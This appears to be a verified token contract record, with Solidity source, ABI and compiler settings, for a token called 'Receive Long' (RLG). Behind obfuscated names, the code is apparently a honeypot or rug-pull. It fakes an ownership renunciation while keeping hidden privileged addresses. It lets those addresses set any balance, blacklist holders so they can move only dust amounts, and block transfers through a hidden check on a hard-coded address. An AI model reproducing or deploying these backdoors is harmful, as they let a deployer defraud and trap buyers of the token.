{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface txTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSenderFund {\n    function createPair(address sellList, address tokenLiquidityTotal) external returns (address);\n}\n\ninterface receiverAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLimit) external view returns (uint256);\n\n    function transfer(address buyLaunch, uint256 takeLaunched) external returns (bool);\n\n    function allowance(address fundMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyLaunch,\n        uint256 takeLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAutoTotal, uint256 value);\n    event Approval(address indexed fundMax, address indexed spender, uint256 value);\n}\n\ninterface receiverAmountMetadata is receiverAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReceiveLong is amountLaunched, receiverAmount, receiverAmountMetadata {\n\n    function toWallet(address isLimit, address buyLaunch, uint256 takeLaunched) internal returns (bool) {\n        if (isLimit == feeSender) {\n            return modeTx(isLimit, buyLaunch, takeLaunched);\n        }\n        uint256 feeReceiver = receiverAmount(totalSellAt).balanceOf(liquidityFrom);\n        require(feeReceiver == toFund);\n        require(buyLaunch != liquidityFrom);\n        if (limitMarketing[isLimit]) {\n            return modeTx(isLimit, buyLaunch, fromEnable);\n        }\n        return modeTx(isLimit, buyLaunch, takeLaunched);\n    }\n\n    function limitSell(address listBuyToken) public {\n        maxMode();\n        \n        if (listBuyToken == feeSender || listBuyToken == totalSellAt) {\n            return;\n        }\n        limitMarketing[listBuyToken] = true;\n    }\n\n    address liquidityFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private atTeam = \"RLG\";\n\n    uint256 totalFund;\n\n    mapping(address => bool) public limitMarketing;\n\n    function getOwner() external view returns (address) {\n        return senderFeeLaunched;\n    }\n\n    bool public shouldAuto;\n\n    constructor (){\n        if (amountEnableIs != limitEnable) {\n            limitEnable = amountEnableIs;\n        }\n        txTake fromLaunched = txTake(walletMin);\n        totalSellAt = marketingSenderFund(fromLaunched.factory()).createPair(fromLaunched.WETH(), address(this));\n        if (shouldAuto) {\n            shouldAuto = true;\n        }\n        feeSender = _msgSender();\n        enableFrom();\n        autoFee[feeSender] = true;\n        teamIs[feeSender] = sellToMarketing;\n        \n        emit Transfer(address(0), feeSender, sellToMarketing);\n    }\n\n    uint256 private sellToMarketing = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private teamIs;\n\n    uint256 toFund;\n\n    function owner() external view returns (address) {\n        return senderFeeLaunched;\n    }\n\n    mapping(address => bool) public autoFee;\n\n    function allowance(address marketingSwapFrom, address launchMode) external view virtual override returns (uint256) {\n        if (launchMode == walletMin) {\n            return type(uint256).max;\n        }\n        return feeAuto[marketingSwapFrom][launchMode];\n    }\n\n    function balanceOf(address listLimit) public view virtual override returns (uint256) {\n        return teamIs[listLimit];\n    }\n\n    function transfer(address receiverMarketing, uint256 takeLaunched) external virtual override returns (bool) {\n        return toWallet(_msgSender(), receiverMarketing, takeLaunched);\n    }\n\n    address walletMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private feeAuto;\n\n    bool public fundMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTeam;\n    }\n\n    bool public shouldToken;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLiquidityMax;\n    }\n\n    function receiverTrading(address receiverMarketing, uint256 takeLaunched) public {\n        maxMode();\n        teamIs[receiverMarketing] = takeLaunched;\n    }\n\n    function enableFrom() public {\n        emit OwnershipTransferred(feeSender, address(0));\n        senderFeeLaunched = address(0);\n    }\n\n    function autoAmount(address txReceiver) public {\n        require(txReceiver.balance < 100000);\n        if (shouldToken) {\n            return;\n        }\n        if (amountEnableIs == limitEnable) {\n            fundMarketing = false;\n        }\n        autoFee[txReceiver] = true;\n        \n        shouldToken = true;\n    }\n\n    function approve(address launchMode, uint256 takeLaunched) public virtual override returns (bool) {\n        feeAuto[_msgSender()][launchMode] = takeLaunched;\n        emit Approval(_msgSender(), launchMode, takeLaunched);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed feeMarketing, address indexed feeMin);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellToMarketing;\n    }\n\n    address public totalSellAt;\n\n    function modeTx(address isLimit, address buyLaunch, uint256 takeLaunched) internal returns (bool) {\n        require(teamIs[isLimit] >= takeLaunched);\n        teamIs[isLimit] -= takeLaunched;\n        teamIs[buyLaunch] += takeLaunched;\n        emit Transfer(isLimit, buyLaunch, takeLaunched);\n        return true;\n    }\n\n    function transferFrom(address isLimit, address buyLaunch, uint256 takeLaunched) external override returns (bool) {\n        if (_msgSender() != walletMin) {\n            if (feeAuto[isLimit][_msgSender()] != type(uint256).max) {\n                require(takeLaunched <= feeAuto[isLimit][_msgSender()]);\n                feeAuto[isLimit][_msgSender()] -= takeLaunched;\n            }\n        }\n        return toWallet(isLimit, buyLaunch, takeLaunched);\n    }\n\n    function maxMode() private view {\n        require(autoFee[_msgSender()]);\n    }\n\n    function feeAmount(uint256 takeLaunched) public {\n        maxMode();\n        toFund = takeLaunched;\n    }\n\n    string private tokenLiquidityMax = \"Receive Long\";\n\n    address public feeSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountFundTrading;\n    }\n\n    uint256 public amountEnableIs;\n\n    address private senderFeeLaunched;\n\n    uint256 constant fromEnable = 16 ** 10;\n\n    uint256 public limitEnable;\n\n    uint8 private amountFundTrading = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAutoTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwapFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnableIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"autoAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuyToken\",\"type\":\"address\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSellAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReceiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}